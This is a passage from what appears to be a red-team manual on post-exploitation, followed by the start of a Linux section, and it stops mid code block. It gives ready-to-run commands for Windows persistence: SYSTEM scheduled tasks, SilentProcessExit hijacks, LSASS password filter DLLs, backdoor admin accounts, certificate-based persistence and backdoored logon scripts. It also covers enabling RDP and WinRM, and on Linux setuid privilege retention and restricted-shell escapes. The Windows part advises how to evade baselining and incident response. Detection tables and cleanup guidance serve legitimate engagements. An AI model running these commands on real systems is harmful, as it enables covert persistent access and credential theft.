```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SysMonFilter'" | Remove-WmiObject
```

**Scheduled tasks as SYSTEM.** With elevation you can register a task running as `NT AUTHORITY\SYSTEM`, with boot triggers, event triggers, and no requirement for a user session. Event-based triggers are the interesting part: a task that triggers on a specific event ID in a specific log gives you execution in response to a condition you control, for example an event you can generate remotely.

```powershell
$a = New-ScheduledTaskAction -Execute "C:\Windows\System32\svc.exe"
$t = New-ScheduledTaskTrigger -AtStartup
$p = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "Microsoft\Windows\Maintenance\HealthCheck" -Action $a -Trigger $t -Principal $p
```

Tasks exist both as XML files under `%WINDIR%\System32\Tasks` and as registry entries under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache`. Manipulating the registry entries directly to hide a task from the Task Scheduler UI (by removing the `SD` security descriptor value) is a known trick; be aware that it makes the task invisible to your own cleanup enumeration too, so if you do it, record it.

**Image File Execution Options and SilentProcessExit.** IFEO `Debugger` values under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe>` cause your binary to be launched with the original command line whenever that image is executed. The related `SilentProcessExit` key with a `MonitorProcess` value and a `GlobalFlag` of `0x200` on the target image launches your process when the target exits instead. The latter is meaningfully quieter because it is a less-known key and because the trigger is process termination rather than process start.

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\Windows\System32\svc.exe" /f
```

**Security support providers.** Adding a DLL to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` causes LSASS to load it at boot, giving you code running inside LSASS as SYSTEM with visibility of authentication. mimikatz's `misc::memssp` does the in-memory equivalent, injecting a credential-logging provider without a registry change, which does not survive reboot but leaves no persistent artefact. The registry route is durable but has two problems on modern hosts: LSA protection requires LSASS-loaded modules to be appropriately signed, so an unsigned DLL simply will not load, and the registry value itself is a well-known monitored location.

**Authentication packages and password filters.** `Authentication Packages` under the same Lsa key loads a DLL implementing an authentication package. More interesting is `Notification Packages`, which loads password filter DLLs. A password filter is called by LSASS with the **plaintext new password** every time a password is changed, which on a domain controller means every password change in the domain passes through your code in cleartext. This is the single most valuable credential-capture persistence available, it is completely unaffected by Credential Guard because it intercepts the password in transit rather than at rest, and it requires a signed DLL on hosts with LSA protection.

**Driver-based options.** A kernel driver gives you the strongest possible position and the highest cost: Secure Boot and driver signature enforcement mean you need a valid signing certificate or a signed vulnerable driver, HVCI restricts what a loaded driver can do, and the Microsoft vulnerable driver blocklist actively blocks the well-known candidates. Driver load is audited (`Microsoft-Windows-CodeIntegrity` operational log, and Sysmon event 6). Consider this appropriate for a long-duration red team with a specific requirement, not for general persistence.

**Other elevated autostart locations worth knowing.** Print monitors under `HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors` load DLLs into the spooler service as SYSTEM at boot. Netsh helper DLLs registered with `netsh add helper` load whenever `netsh` runs. Time provider DLLs under the W32Time service configuration load into the time service. LSA extensions, AppCert DLLs, and `AppInit_DLLs` all exist, though `AppInit_DLLs` is disabled when Secure Boot is on and is effectively dead on modern hardware. Winlogon `Userinit` and `Shell` values in `HKLM` run at every logon and are more durable than the per-user equivalents.

### Credential-based persistence

The quietest and most durable category, and the one the source notes gestured at without understanding why it matters. A credential-based backdoor generates authentication events, not process events. It has no binary to detect, no autorun entry to enumerate, no injected process, no unsigned module. On a host with behavioural EDR, this is the difference between persistence that survives the engagement and persistence that survives ninety seconds.

**An additional local administrator account.** Crude, effective, and easily detected by any account-review process, but it survives reboots, EDR updates, and reimaging of other hosts. The source's version was broken; here it is correctly.

```cmd
net user svc_backup "Str0ngP@ssw0rd!" /add
net localgroup Administrators svc_backup /add
```

```powershell
$pass = ConvertTo-SecureString "Str0ngP@ssw0rd!" -AsPlainText -Force
New-LocalUser -Name "svc_backup" -Password $pass -PasswordNeverExpires -AccountNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member "svc_backup"
```

**Common mistake.** Three traps in that snippet, all of which appear in circulated versions of it:

- `New-LocalUser -Password %pass` uses the batch-file sigil. PowerShell variables use `$`, so it must be `-Password $pass`. With `%pass` PowerShell treats the token as a literal string, fails to bind it to the `SecureString` parameter, and you get a parameter binding error rather than a user.
- `Add-LocalGroupMember -Groups` is not a parameter. The parameter is singular: `-Group`. Passing `-Groups` produces `A parameter cannot be found that matches parameter name 'Groups'`.
- The group is `Administrators`, plural, not `Administrator`. `Administrator` is the built-in *user*. `Add-LocalGroupMember -Group "Administrator"` fails with a group-not-found error.

Also note that `net user USER PASS /y /add` as written in the source has a spurious `/y`. That switch is a confirmation-suppression flag for a few `net` subcommands and is not meaningful for `net user`; it will either be ignored or rejected depending on the build. Drop it.

For the Metasploit equivalent, if you are in that workflow:

```text
msf6 > use post/windows/manage/add_user
msf6 post(windows/manage/add_user) > set SESSION <id>
msf6 post(windows/manage/add_user) > set USERNAME svc_backup
msf6 post(windows/manage/add_user) > set PASSWORD Str0ngP@ssw0rd!
msf6 post(windows/manage/add_user) > set GROUP Administrators
msf6 post(windows/manage/add_user) > run
```

**Adding a machine account to a privileged group.** Substantially quieter than adding a user, because computer objects in groups attract far less scrutiny than users, and because you already hold the machine account credential from LSA secrets so there is no password to set or remember. A workstation's machine account in `Domain Admins` or in a local `Administrators` group on a target host is durable persistence: machine account passwords rotate every 30 days by default, but *you* control the machine, so you learn the new one automatically. This spans into domain persistence, which is covered in the AD persistence and dominance material in the Coercion, Relay and Certificate Abuse section, but the local variant (adding a machine account or a domain group you control to a target host's local `Administrators`) is squarely host persistence.

**A certificate that survives password resets.** The strongest single item in this section. Request a client authentication certificate for a user or computer from an enterprise CA, and you hold a credential that authenticates via PKINIT for the certificate's entire validity period, commonly one or two years, and which **is not invalidated by a password change**. Incident response that resets every password in the domain does not touch your certificate. Revocation is the only remedy and most organisations never check.

```bash
certipy req -u $USER@$DOMAIN -p "$PASS" -target $DC -ca 'CORP-CA' -template 'User'
certipy auth -pfx user.pfx -dc-ip $DC
```

The related primitive is **shadow credentials**: writing a key credential to a target's `msDS-KeyCredentialLink` attribute, which lets you authenticate as that principal via PKINIT using a key you generated. It requires write access to the attribute, a 2016-or-later domain controller, and a functioning PKI, and it is both a persistence mechanism and a takeover primitive. See the Coercion, Relay and Certificate Abuse section for the full ADCS and shadow credentials treatment, and the Kerberos Abuse section for what the resulting PKINIT authentication gets you.

**Steal rather than add, wherever possible.** Every "add" above creates an object that did not exist, and object creation is what account-review and baselining processes detect. Taking over something that already exists creates nothing. Concretely: instead of creating `svc_backup`, find a disabled or dormant service account and use its existing credential, or reset a stale account nobody monitors. Instead of adding yourself to `Administrators`, find the group that is already nested into `Administrators` and that you can write to. Instead of installing a service, use an existing service's credential. The audit trail for using an existing credential is a logon event indistinguishable from legitimate use; the audit trail for creating an account is a 4720 that someone's SIEM rule is watching for.

### Backdooring what already exists

The logical extension of "steal rather than add". Instead of installing a new persistence mechanism, modify one the organisation installed itself. Nothing new appears in an autoruns diff, because the entry was always there. What changed is the content it points at, which is a much harder thing to baseline.

**Existing scheduled tasks.** Modify the action of a task the organisation already runs. A task that runs nightly as SYSTEM to do a backup or a cleanup, whose action you have changed to also run your payload, is nearly invisible to enumeration-based detection. Either edit the task's XML under `%WINDIR%\System32\Tasks\<name>` or use the API.

```powershell
$t = Get-ScheduledTask -TaskName "SomeExistingTask"
$t.Actions[0].Execute = "C:\Windows\System32\svc.exe"
Set-ScheduledTask -InputObject $t
```

**Existing service binaries.** If a service's binary path is writable by a group you control, replacing or patching the binary gives you SYSTEM execution at every boot under a service name that has always existed. This is the same weak-permissions condition as the privilege escalation path, used for persistence instead. Check the ACL on the binary and on every parent directory in its path, and check unquoted service paths.

```powershell
Get-CimInstance Win32_Service | Select-Object Name, PathName, StartMode, StartName |
  Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' }
```

**Existing scripts on shares.** The highest-leverage version of this idea. Logon scripts in `NETLOGON`, GPO startup and shutdown scripts in `SYSVOL`, software deployment scripts on a distribution share, scheduled maintenance scripts on a file server: any of these that you can write to executes on many hosts, as many users or as SYSTEM, on a schedule the organisation maintains for you. A single appended line in a logon script that thousands of users execute daily is both persistence and lateral movement, and it will be attributed to the script, not to you. `NETLOGON` and `SYSVOL` write access should be checked on every engagement for exactly this reason.

**Backdooring an installed application's own configuration.** Application-level extension points (an office suite add-in registered in `HKCU`, a template with a macro, a browser extension, an agent's plugin directory, an IDE's task runner configuration) execute as part of software the user runs deliberately. These are almost never in a persistence baseline.

### Local account and group manipulation, and remote access

The mechanical bits, done correctly, since you will need them.

```cmd
rem Enumerate before changing anything.
net user
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"
net accounts
```

```powershell
Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet
Get-LocalGroupMember -Group Administrators
```

```cmd
rem Modify.
net user svc_backup "Str0ngP@ssw0rd!" /add
net localgroup Administrators svc_backup /add
net localgroup "Remote Desktop Users" svc_backup /add
net user Guest /active:yes
net user targetuser "NewP@ss123" /domain
```

Note that `net user <name> <password> /domain` resets a domain password and requires the corresponding right; it is included because it is sometimes the fastest route to using an account you cannot otherwise authenticate as, and because it is destructive and highly visible, so use it knowingly.

**Enabling RDP.** Frequently the difference between a shell and comfortable interactive access.

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

Two adjacent settings you will need. Network Level Authentication under `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp` with `UserAuthentication` controls whether pre-authentication is required; disabling it is sometimes necessary for older clients and is a visible weakening of the host. And `LocalAccountTokenFilterPolicy` under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` set to 1 allows non-RID-500 local administrators to use their full token remotely, which is what makes a newly created local admin account usable for remote administration and pass-the-hash.

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

**Enabling WinRM**, which is quieter than RDP because it produces no interactive session and no user-visible presence:

```powershell
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "$ATTACKER" -Force
```

Every one of these is a configuration weakening that a compliance scan will flag and that you must reverse at the end of the engagement. Record the original value before you change it.

### Durability and detectability comparison

| Mechanism | Privilege | Survives reboot | Survives password change | Runs as | Detectability |
| --- | --- | --- | --- | --- | --- |
| HKCU Run / RunOnce key | User | Yes | Yes | User | High, surfaced in Task Manager Startup |
| Startup folder item | User | Yes | Yes | User | High |
| User scheduled task | User | Yes | Yes | User | Medium to high, 4698 |
| PowerShell or cmd profile | User | Yes | Yes | User | Low to medium |
| `UserInitMprLogonScript` | User | Yes | Yes | User | Low to medium |
| COM hijack (HKCU) | User | Yes | Yes | User, in a host process | Low |
| Shell handler hijack | User | Yes | Yes | User, in Explorer | Low |
| Windows service (new) | Admin | Yes | Yes | SYSTEM | Very high, 7045 and 4697 |
| `ServiceDll` in existing svchost service | Admin | Yes | Yes | SYSTEM, in svchost | Medium |
| Service recovery action | Admin | Yes | Yes | SYSTEM | Low |
| SYSTEM scheduled task | Admin | Yes | Yes | SYSTEM | Medium to high, 4698 |
| WMI permanent event subscription | Admin | Yes | Yes | SYSTEM, via WmiPrvSE | Low, and missed by many autorun tools |
| IFEO Debugger | Admin | Yes | Yes | Whoever launches the target | High, well signatured |
| SilentProcessExit MonitorProcess | Admin | Yes | Yes | Depends on trigger | Low to medium |
| Security support provider (registry) | Admin | Yes | Yes | SYSTEM, in LSASS | Medium, blocked by LSA protection if unsigned |
| Password filter DLL | Admin | Yes | Yes, and captures the new one | SYSTEM, in LSASS | Medium, extremely high value |
| In-memory SSP injection | Admin | **No** | N/A | SYSTEM, in LSASS | Low while resident |
| Print monitor / netsh helper / time provider DLL | Admin | Yes | Yes | SYSTEM | Low to medium |
| Kernel driver | Admin plus signing | Yes | Yes | Kernel | Load is audited, but post-load visibility is low |
| Accessibility binary replacement | Admin plus TrustedInstaller | Yes | Yes | SYSTEM, pre-logon | Very high |
| New local admin account | Admin | Yes | Yes | The account | High, 4720 and 4732 |
| Machine account added to a privileged group | Admin or delegated write | Yes | Yes, you learn the rotation | The machine | Medium |
| Existing account credential (stolen) | None beyond obtaining it | Yes | **No** | The account | Very low |
| Client authentication certificate | Enrolment rights | Yes | **Yes**, for the certificate lifetime | The principal | Very low, unless certificate issuance is reviewed |
| Shadow credential on an object | Write to `msDS-KeyCredentialLink` | Yes | Yes | The principal | Low, unless the attribute is audited |
| Backdoored existing scheduled task | Admin | Yes | Yes | Whatever the task ran as | Very low, task already existed |
| Backdoored existing service binary | Write to the path | Yes | Yes | SYSTEM usually | Low |
| Backdoored logon or GPO script on a share | Write to the share | Yes | Yes | Many users or SYSTEM, many hosts | Low, and very high reach |
| RDP or WinRM enablement | Admin | Yes | Yes | N/A, access enabler | Medium, and flagged by compliance scanning |

Read the bottom third of that table twice. The mechanisms with the best durability-to-detectability ratio are, without exception, the ones that add nothing new: a stolen credential, a certificate, a modified existing task, an appended line in a script the organisation already runs.

### Cleanup discipline

Every persistence mechanism you install is an artefact you are responsible for removing. Track them as you go, in a form you can act on later:

- The exact mechanism type and its full identifier: registry path and value name, task path and name, service name, WMI filter/consumer/binding names, account name and SID, certificate thumbprint and serial.
- The host, and the account you installed it as.
- The original value of anything you overwrote, verbatim, so you can restore rather than delete.
- The file paths of anything you dropped, including anything the payload itself wrote.
- Timestamps, so you can correlate with the client's own logs during the debrief.

Removal is the reverse of installation, and it is not optional. Delete the registry values you added and restore the ones you changed. Unregister tasks and services. Remove all three WMI objects, not just the consumer, because an orphaned filter and binding are still artefacts. Delete accounts you created and remove group memberships you added. Revoke certificates you requested, or at minimum hand the serial numbers to the client so they can revoke them. Restore `fDenyTSConnections`, `LocalAccountTokenFilterPolicy`, `UserAuthentication`, and any other setting you weakened. Delete credential material and dump files from your own systems once the report is delivered, including that LSASS dump you left in a working directory.

An untracked backdoor left behind after an engagement is a serious professional failure. It is a live, undocumented, unmonitored route into the client's estate that they do not know about and cannot defend, with your fingerprints on it. If you cannot say with certainty what you installed and where, you have failed at the part of the job that actually matters, and the client's next real intruder inherits your access. Write it down as you install it, not afterwards from memory.

## Detection

### Credential access telemetry

Credential access is the most heavily instrumented behaviour class on a modern Windows endpoint, more than execution, more than lateral movement, more than exfiltration. That is a deliberate industry response to a decade of mimikatz, and it means the assumption "I have SYSTEM so I can dump LSASS" is a 2020 assumption. Assume any interaction with LSASS is seen, and plan for it to be seen.

| Signal | Source | What it catches |
| --- | --- | --- |
| Sysmon 10 (ProcessAccess) with `TargetImage` `lsass.exe` | Sysmon | Any handle open to LSASS, with the `GrantedAccess` mask as the discriminator |
| `ObRegisterCallbacks` handle stripping | EDR kernel driver | Blocks or degrades the read before you see it, producing silent partial dumps |
| Threat-intelligence ETW provider | Kernel ETW | Memory read patterns and injection, independent of userland hooking |
| ASR rule for blocking credential theft from LSASS | Defender | Blocks or audits the classic dump paths outright |
| Defender 1116 / 1117 | Defender operational log | Signature match on dump content or tooling |
| 4688 and Sysmon 1 process creation with command lines | Security / Sysmon | `procdump`, `rundll32 comsvcs`, `reg save HKLM\SAM`, `vssadmin`, `ntdsutil`, `esentutl /vss` |
| Sysmon 11 file create | Sysmon | Large minidump files, hive copies in temp directories |
| 4656 / 4663 object access | Security | Reads of the SAM, SECURITY, and `ntds.dit` files where SACLs are set |
| 4662 with replication extended right GUIDs | DC Security log | DCSync from a non-DC principal. The highest-fidelity signal in this whole document |
| DRSUAPI RPC from a non-DC source | Network / identity sensor | Same, from the wire |
| 4768 volume anomaly with certificate information | DC Security log | Mass PKINIT, as produced by CA-key-based hash recovery |
| 4776 NTLM validation volume | DC Security log | Credential spraying and validation of dumped hashes |
| 7045 / 4697 service install | System / Security | Remote secretsdump-style extraction, and new-service persistence |
| MS-BKRP backup key retrieval | DC | Domain DPAPI backup key theft |
| 4103 / 4104 PowerShell script block logging | PowerShell operational | Invoke-Mimikatz and any in-memory PowerShell tooling, including deobfuscated content |
| `Microsoft-Windows-CodeIntegrity` 3033 / 3063, Sysmon 6 | Operational logs | Unsigned or blocklisted driver load, PPL bypass attempts |
| Identity provider sign-in logs | Cloud tenant | Stolen token and cookie replay, unfamiliar device and location |

The actions that will get you caught immediately, on a well-instrumented host, are worth naming plainly: opening a read handle to LSASS by any means; `rundll32` with a `comsvcs` `MiniDump` command line; `procdump` against LSASS; writing the WDigest `UseLogonCredential` registry value; loading an unsigned or blocklisted driver; a full-domain DCSync; and `ntdsutil ifm` on a domain controller. If you do any of these, do it once, from the host where it is worth the cost, with an exit plan.

### Persistence telemetry

| Signal | Source | What it catches |
| --- | --- | --- |
| 4720 | Security | Local user account created |
| 4722 / 4724 / 4738 | Security | Account enabled, password reset, account changed |
| 4728 / 4732 / 4756 | Security | Member added to a global, local, or universal group |
| 4698 / 4699 / 4700 / 4701 / 4702 | Security | Scheduled task created, deleted, enabled, disabled, updated |
| 7045 (System) and 4697 (Security) | System / Security | Service installed |
| 7040 | System | Service start type changed, for example manual to automatic |
| Sysmon 12 / 13 / 14 | Sysmon | Registry key and value creation and modification: Run keys, IFEO, Lsa packages, COM CLSIDs, print monitors |
| Sysmon 19 / 20 / 21 | Sysmon | WMI event filter, consumer, and binding creation. The specific detection for WMI persistence |
| `Microsoft-Windows-WMI-Activity` operational | WMI log | Permanent subscription registration and consumer execution |
| Sysmon 11 | Sysmon | Files written to Startup folders, `System32\Tasks`, service binary paths |
| Sysmon 7 | Sysmon | Image load of an unexpected DLL into LSASS, spoolsv, svchost, or Explorer |
| 4657 | Security | Registry value modified, where auditing is configured on the key |
| 4670 | Security | Permissions on an object changed, which catches ACL-based backdoors |
| 1102 | Security | Audit log cleared. Never do this; it is louder than whatever you were hiding |
| Certificate issuance records on the CA | CA logs | Certificate-based persistence, if anyone reviews issuance |
| Directory attribute auditing on `msDS-KeyCredentialLink` | DC Security log | Shadow credentials |

### Autorun and persistence baselining

The defensive practice you are working against is baselining. A team that has a known-good inventory of every autostart location, service, scheduled task, WMI subscription, and local account on a standard build can diff a suspect host against it and find *anything you added* in minutes, regardless of how cleverly you named it. Naming your service `Windows Update Orchestration` does not help against a diff. Enterprise EDR increasingly ships this as a built-in capability, enumerating the same locations Autoruns does and scoring anything unexpected.

That is the single strongest argument for the "backdoor what already exists" and "credential rather than implant" approaches. A modified existing task does not appear in a diff of *which* tasks exist, only in a diff of task *contents*, which far fewer organisations baseline. A stolen credential does not appear in any autorun inventory at all, because it is not an autorun. A certificate you legitimately requested appears only in CA issuance logs, which almost nobody reviews.

The practical implication for your own operations: assume anything you add to a well-known autostart location will be found during incident response, and choose it accordingly. Use loud, durable mechanisms as decoys or as expendable backups, keep your real persistence in the credential and configuration layers, and never rely on a single mechanism. Layer them, at different noise levels, so that the discovery of the obvious one does not cost you the quiet one.



# Linux Post-Exploitation

## Host enumeration and local privilege escalation

Linux escalation is not a list of commands, it is a search for a place where a privileged thing trusts an unprivileged thing. Privileged code runs constantly on any host: setuid binaries, cron, systemd units, D-Bus services, sudo, container runtimes, backup agents, monitoring agents. Escalation is finding the one that reads a file you can write, executes a name you can resolve, loads a library you can place, or accepts an argument you can control. Everything below is organised around that question.

### Situational awareness

Before enumerating anything, establish exactly what you are and where you are. Most wasted time on a Linux host comes from operators who did not notice they were in a container, in a restricted shell, in a confined SELinux domain, or already holding a capability that made the rest of the search unnecessary.

#### Identity, groups, and the three UIDs

```bash
id
id -Z                       # SELinux context, errors if SELinux is absent
whoami; hostname; hostname -f
cat /proc/self/status | grep -E '^(Uid|Gid|Groups|CapEff|CapPrm|CapBnd|CapAmb|NoNewPrivs|Seccomp)'
groups
getent passwd $(id -u)
```

*/proc/self/status* is the authoritative view and `id` is a convenience wrapper over part of it. The `Uid:` line gives four values in order: **real**, **effective**, **saved set-user-ID**, and **filesystem UID**.

The distinction matters more than most operators realise. The **real UID** is who you are, the **effective UID** is what the kernel uses for permission checks, and the **saved UID** exists so a privileged process can drop to the real UID temporarily and then restore itself. When a setuid-root binary executes, real stays as the invoking user, effective becomes 0, and saved becomes 0. That means a process can be running as you and as root simultaneously.

This is exactly why naively popping a shell out of a setuid binary hands you back a non-root shell. Both *bash* and *dash* check at startup whether the effective UID differs from the real UID, and if it does they reset the effective UID back to the real one unless started with `-p`. So a setuid binary calling `system("/bin/sh")` gives you a shell with euid dropped back to your own. The fixes are to either preserve privileges or make the elevation permanent:

```bash
# from a shell escape inside a setuid-root context
/bin/bash -p
# or make real == effective == saved so nothing can drop back
python3 -c 'import os; os.setresuid(0,0,0); os.execl("/bin/bash","bash")'
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
```

A shell showing `uid=1000 euid=0` is not a stable foothold. Anything it spawns that drops privileges loses root, and writing files may produce files owned by your user. Normalise to real root as soon as you get a euid-0 primitive. Check with:

```bash
id                       # look for euid= being reported separately
awk '/^Uid:/ {print}' /proc/self/status
```

The same logic applies to GIDs via the `Gid:` line, and to supplementary groups. Supplementary groups are frequently the whole escalation: `docker`, `lxd`, `disk`, `adm`, `shadow`, `sudo`, `wheel`, `admin`, `video`, `kvm`, `libvirt`, and any bespoke group used by a deployment tool. Never dismiss a group name you do not recognise, look up what owns files with that group:

```bash
find / -group docker -o -group lxd -o -group disk 2>/dev/null
getent group | awk -F: '$4 != "" {print}'      # groups with members
```

| Group | Why it is interesting |
| --- | --- |
| `docker`, `podman`-socket members | Direct root, see the container runtime socket section below |
| `lxd`, `lxc` | Direct root via a privileged container mounting the host root |
| `disk` | Raw read and write access to block devices, read the filesystem past permissions, write `/etc/shadow` |
| `shadow` | Read `/etc/shadow` for offline cracking |
| `adm` | Read most of `/var/log`, which frequently contains credentials |
| `sudo`, `wheel`, `admin` | Password-gated root, valuable once you have or crack the password |
| `kvm`, `libvirt` | Access to guest disk images, which are other hosts' filesystems |
| `systemd-journal` | Read the journal, which leaks command lines and secrets |
| `video`, `input` | Framebuffer and keyboard event devices on a desktop, screen capture and keylogging |
| `crontab` | Ability to install cron jobs, useful for persistence and sometimes escalation |

#### Capabilities on your own process

Modern Linux splits root into around forty capabilities. You may hold one without being root, and a container almost always holds a reduced set. Decode the masks rather than eyeballing hex:

```bash
capsh --print
getpcaps $$
grep Cap /proc/self/status
capsh --decode=0x00000000a80425fb
```

The sets you care about are **CapEff** (what you can use right now), **CapPrm** (what you may raise into effective), **CapBnd** (the ceiling for this process and its children, the strongest signal for whether you are in a container), and **CapAmb** (ambient, inherited across a non-setuid `execve`). A full `CapBnd` of `000001ffffffffff` or similar on a modern kernel means an unrestricted bounding set, which is normal for a real host and unusual for a container. A short bounding set that omits `cap_sys_admin` is a container fingerprint.

`NoNewPrivs: 1` tells you the process is running under `PR_SET_NO_NEW_PRIVS`, which means setuid bits and file capabilities will be ignored for anything you execute from here. Every setuid escalation path is dead in that shell until you get a fresh process tree without the flag. `Seccomp: 2` means a seccomp filter is active, which will silently break exploits that use unusual syscalls.

#### Container, VM, or metal

Answer this before you spend an hour on kernel exploits that will only get you root in a namespace you were already root in.

```bash
systemd-detect-virt                 # prints e.g. kvm, vmware, docker, lxc, podman, none
systemd-detect-virt --container
systemd-detect-virt --vm
ls -la /.dockerenv /run/.containerenv 2>/dev/null
cat /run/.containerenv 2>/dev/null  # podman writes engine and image details here
cat /proc/1/cgroup /proc/self/cgroup
cat /proc/1/comm; ps -p 1 -o comm=
findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS / /proc /sys
ls -l /proc/self/ns; ls -l /proc/1/ns
```

Reasoning through the signals rather than trusting one:

- **PID 1 is not init or systemd.** If `/proc/1/comm` is your application, a shell, or an entrypoint script, you are in a container or a namespace.
- **Root filesystem type.** `overlay` on `/` is a container. `btrfs` on `/` with an LXC-style subvolume path is LXC. On a real host you expect `ext4`, `xfs`, or `btrfs` with a device-backed source.
- **Namespace inode comparison.** If `/proc/self/ns/*` and `/proc/1/ns/*` inodes match but differ from what you would expect on the host, you are in the same namespaces as PID 1 of the container. If you can read `/proc/1/ns` at all and the inodes differ from yours you are in a nested namespace.
- **Reduced capability bounding set**, as above.
- **cgroup v2 unified hierarchy** shows `0::/` for everything, so cgroup paths are far less useful than they were on cgroup v1. Use `/proc/1/cgroup` and the mount table instead.
- **`/sys/fs/cgroup/memory.max` or `memory/memory.limit_in_bytes`** set to something far below physical RAM implies a container.
- **Missing devices.** `ls /dev` showing only a handful of entries is a container. A full `/dev` with `sda`, `nvme0n1`, `kmsg`, `mem` is a host, or a privileged container.
- **DMI data** identifies the hypervisor on a VM:

```bash
cat /sys/class/dmi/id/product_name /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/bios_vendor 2>/dev/null
lscpu | grep -iE 'hypervisor|virtual'
grep -o hypervisor /proc/cpuinfo | head -1
dmidecode -s system-product-name 2>/dev/null      # needs root
ls /sys/hypervisor 2>/dev/null
```

Product names map cleanly: `VMware Virtual Platform` or `VMware20,1`, `VirtualBox`, `KVM`, `Standard PC (Q35 + ICH9)` for QEMU, `Google Compute Engine`, `Amazon EC2`, `Virtual Machine` with vendor `Microsoft Corporation` for Hyper-V and Azure. Cloud metadata endpoints are a second confirmation and are covered in the cloud instance metadata material in the companion part of this Linux Post-Exploitation section.

If you are in a container, escalation to root inside the container is usually easy and usually pointless on its own. The question becomes container escape, which the companion part covers. The one thing worth doing immediately is checking for a mounted host socket or a mounted host path, because that turns a container shell into host root in one step.

#### Distribution, kernel, and what is actually installed

```bash
cat /etc/os-release
cat /etc/*-release /etc/issue 2>/dev/null
uname -a
cat /proc/version
arch; uname -m
ldd --version | head -1           # glibc version, or musl on Alpine
```

The kernel version string alone is not enough to judge exploitability. Enterprise distributions backport fixes without changing the upstream version, so a RHEL kernel reporting `4.18.0` may contain fixes from far newer trees. Always resolve the exact package build:

```bash
rpm -q kernel kernel-core 2>/dev/null
dpkg -l 'linux-image*' 2>/dev/null
grubby --default-kernel 2>/dev/null
cat /proc/cmdline
```

Then check that build against the distribution's own security tracker rather than against an upstream CVE range. A Debian or Ubuntu kernel `5.15.0-91-generic` is a specific build with a specific patch state.

Take stock of the toolchain, because it determines what is even possible without uploading anything:

```bash
for b in python3 python perl ruby php gcc cc make curl wget nc ncat socat openssl \
         base64 xxd gdb strace ltrace tar rsync git jq docker podman kubectl \
         systemctl busybox sudo pkexec find awk; do
  command -v "$b" >/dev/null 2>&1 && printf '%-12s %s\n' "$b" "$(command -v "$b")"
done
```

Absence is informative too. A host with no compiler, no interpreters, and a busybox userland is either minimal by design (container, appliance, embedded) or hardened. Where interpreters are missing, static binaries you bring in become the plan, and where the filesystem is `noexec` you need the techniques in the hardening section below.

Check whether the shell you have is a real shell:

```bash
echo $0; echo $SHELL
echo $BASH_VERSION $ZSH_VERSION
compgen -c | wc -l          # in a restricted shell this is short
cd /; echo $?               # rbash blocks cd
echo ${PATH}                # rbash often forces a single directory
```

A **restricted shell** (`rbash`, `rksh`, `lshell`, `sh -r`, or a `git-shell`/`scponly` login) blocks `cd`, blocks `/` in command names, blocks redirection, and blocks assignment to `PATH`, `SHELL`, `ENV`, and `BASH_ENV`. The reliable escapes are to get any permitted program to spawn an unrestricted child: `vi` then `:set shell=/bin/bash` and `:shell`, `awk 'BEGIN{system("/bin/bash")}'`, `find . -exec /bin/bash \;`, `python3 -c 'import pty;pty.spawn("/bin/bash")'`, or ssh back into the host with `ssh user@localhost -t "bash --noprofile"`. The general rule is the same GTFOBins reasoning described later: you are looking for a permitted binary with an execute primitive.

#### Upgrading a dumb shell to a real TTY

Almost every reverse shell starts as a **dumb shell**: the remote shell's stdin, stdout, and stderr are a socket, not a terminal. Understanding what is missing tells you why the standard incantation is what it is.

A terminal on Linux is a **pseudoterminal pair**: a master end held by whatever is drawing the terminal, and a slave end (`/dev/pts/N`) handed to the program as its controlling terminal. The kernel inserts a **line discipline** between them, and that line discipline is what provides line editing, echo, and, critically, the translation of control characters into signals. It is also what makes the process a member of a session with a controlling terminal, which is what enables job control and process groups.

With a bare socket you lose all of it. There is no `isatty()` success, so `su`, `ssh`, `passwd`, `sudo` prompting for a password, `mysql -p`, and anything using `getpass()` refuse or fail, because they open `/dev/tty` directly to read a secret without echo and there is no `/dev/tty`. There is no line editing, so no arrow keys, no history, no tab completion. There is no `SIGINT` delivery, so Ctrl-C goes to your local `nc` and kills your shell instead of the remote command. There is no terminal size, so `vi`, `less`, `top`, and anything using curses render as garbage or refuse to start. Full-screen programs also need a valid `TERM` to look up a terminfo entry.

**Step one, allocate a PTY on the target.** Any of these work, in rough order of preference:

```bash
# python is the most commonly available
python3 -c 'import pty; pty.spawn("/bin/bash")'
python  -c 'import pty; pty.spawn("/bin/bash")'
# script(1) is on almost every host including busybox-lite systems
script -qc /bin/bash /dev/null
script -q /dev/null                 # BSD/older syntax
# perl
perl -e 'exec "/bin/bash";'         # no pty, only replaces the shell
